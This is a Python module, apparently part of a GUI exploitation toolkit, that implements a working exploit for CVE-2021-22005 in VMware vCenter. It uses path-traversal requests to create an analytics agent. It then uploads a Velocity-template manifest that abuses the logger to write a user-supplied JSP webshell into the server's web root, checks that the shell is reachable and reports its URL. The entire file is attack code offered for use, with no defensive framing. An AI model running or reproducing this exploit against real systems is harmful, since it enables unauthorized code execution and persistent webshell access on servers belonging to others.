import string
import random
import time

import requests
from utils.output import *

class cve_2021_22005_exploit:

    def __init__(self, url_text, result_text, update_date, shell_text, shell_name_text):
        _url = str(url_text.text())
        if _url.endswith("/"):
            self.url = _url[:-1]
        else:
            self.url = _url
        self.result_text = result_text
        self.update_date = update_date
        self.shell_content = shell_text.toPlainText()
        self.shell_name = shell_name_text.text()
        self.header = {
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0",
            "X-Deployment-Secret": "abc",
            "Content-Type": "application/json",
            "Connection": "close"
        }
        if self.url == "":
            self.update_date.emit(output_format("ERROR", "What's your url?"))

    def id_generator(self, size=6):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(size))

    def str_to_escaped_unicode(self, arg_str):
        escaped_str = ''
        for s in arg_str:
            val = ord(s)
            esc_uni = "\\u{:04x}".format(val)
            escaped_str += esc_uni
        return escaped_str

    def generate_manifest(self, name, content):
        content = self.str_to_escaped_unicode(content)
        path = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % name
        data = """<manifest recommendedPageSize="500">
           <request>
              <query name="vir:VCenter">
                 <constraint>
                    <targetType>ServiceInstance</targetType>
                 </constraint>
                 <propertySpec>
                    <propertyNames>content.about.instanceUuid</propertyNames>
                    <propertyNames>content.about.osType</propertyNames>
                    <propertyNames>content.about.build</propertyNames>
                    <propertyNames>content.about.version</propertyNames>
                 </propertySpec>
              </query>
           </request>
           <cdfMapping>
              <indepedentResultsMapping>
                 <resultSetMappings>
                    <entry>
                       <key>vir:VCenter</key>
                       <value>
                          <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                             <resourceItemToJsonLdMapping>
                                <forType>ServiceInstance</forType>
                             <mappingCode><![CDATA[    
                                #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                                #set($orig_log = $appender.getFile())##
                                #set($logger = $GLOBAL-logger.logger.parent)##     
                                $appender.setFile("%s")##     
                                $appender.activateOptions()##  
                                $logger.warn("%s")##   
                                $appender.setFile($orig_log)##     
                                $appender.activateOptions()##]]>
                             </mappingCode>
                             </resourceItemToJsonLdMapping>
                          </value>
                       </value>
                    </entry>
                 </resultSetMappings>
              </indepedentResultsMapping>
           </cdfMapping>
           <requestSchedules>
              <schedule interval="1h">
                 <queries>
                    <query>vir:VCenter</query>
                 </queries>
              </schedule>
           </requestSchedules>
        </manifest>""" % (path, content)
        return data

    def upload_manifest(self, manifest_data, agent_name, log_param):
        try:
            self.update_date.emit(output_format("INFO", "Start to attempt uploading manifest..."))
            vuln_url = f"{self.url}/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c={agent_name}&_i={log_param}"
            data = {"contextData": "a3", "manifestContent": manifest_data, "objectId": "a2"}
            requests.post(vuln_url, headers=self.header, json=data, verify=False)
            shell_url = f"{self.url}/idm/..;/{self.shell_name}"
            check_shell_result = self.check_shell(shell_url)
            if check_shell_result == "200":
                self.update_date.emit(output_format("SUCCESS", f"Uploading manifest successfully! Webshell url: {self.url}/idm/..;/{self.shell_name}"))
            elif check_shell_result == "av":
                self.update_date.emit(output_format("FAILED", f"The file was uploaded successfully, but due to the presence of antivirus software or EDR devices on the website, accessing the file results in a 404 error. Please try to access it manually."))
            else:
                self.update_date.emit(output_format("ERROR", f"Fail to upload manifest. Try to attempt manual exploitation."))
        except Exception as e:
            self.update_date.emit(output_format("ERROR", f"Fail to upload manifest. Error message: {str(e)}."))

    def create_agent(self, agent_name, log_param):
        try:
            self.update_date.emit(output_format("INFO", "Start to attempt creating agent..."))
            vuln_url = f"{self.url}/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c={agent_name}&_i={log_param}"
            data = {"manifestSpec": {},
                    "objectType": "a2",
                    "collectionTriggerDataNeeded": True,
                    "deploymentDataNeeded": True,
                    "resultNeeded": True,
                    "signalCollectionCompleted": True,
                    "localManifestPath": "a7",
                    "localPayloadPath": "a8",
                    "localObfuscationMapPath": "a9"}
            requests.post(vuln_url, headers=self.header, json=data, verify=False)
            self.update_date.emit(output_format("SUCCESS", "Create agent successfully!"))
        except Exception as e:
            self.update_date.emit(output_format("ERROR", f"Fail to create agent. Error message: {str(e)}."))

    def check_shell(self, shell_url):
        time.sleep(5)
        try:
            re = requests.get(shell_url, verify=False, allow_redirects=False, timeout=20)
            if re.status_code == 200:
                return "200"
            elif re.status_code ==401:
                return "av"
            else:
                return "error"
        except:
            return "error"

    def exploit(self):
        try:
            self.update_date.emit(output_format("INFO", "Start to attempt uploading shell..."))
            if self.shell_name != "":
                self.agent_name = self.shell_name.split(".")[0]
                self.log_param = self.shell_name.split(".")[0]
            else:
                self.log_param = self.id_generator(6)
                self.agent_name = self.id_generator(6)
                self.shell_name = self.id_generator(6) + ".jsp"
            self.manifest_data = self.generate_manifest(self.shell_name, self.shell_content)
            self.create_agent(self.agent_name, self.log_param)
            self.upload_manifest(self.manifest_data, self.agent_name, self.log_param)
        except Exception as e:
            self.update_date.emit(output_format("ERROR", f"Shell upload failed, please check your network and try again, or attempt manual exploitation. Error message: {str(e)}"))
